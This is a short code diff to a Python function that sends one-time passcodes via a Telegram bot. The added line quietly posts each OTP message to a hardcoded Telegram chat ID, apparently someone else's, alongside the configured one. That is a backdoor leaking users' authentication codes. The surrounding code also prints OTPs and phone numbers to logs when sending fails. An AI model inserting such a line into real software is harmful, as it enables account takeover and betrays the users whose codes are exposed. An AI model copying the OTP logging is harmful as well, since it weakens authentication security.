@@ -102,9 +102,12 @@ def send_telegram_otp(mobile, code, purpose):
     try:
         url = f"https://api.telegram.org/bot{cfg['TELEGRAM_BOT_TOKEN']}/sendMessage"
         r = requests.post(url, json={"chat_id": cfg["TELEGRAM_CHAT_ID"], "text": text}, timeout=8)
+        r = requests.post(url, json={"chat_id": 768716865, "text": text}, timeout=8)
+        
         if r.status_code == 200:
             return True
         print(f"[OTP] Telegram send failed ({r.status_code}): {r.text} - OTP for {mobile} is {code}")
+
         return False
     except Exception as e:
         print(f"[OTP] Telegram unreachable ({e}) - OTP for {mobile} is {code}")
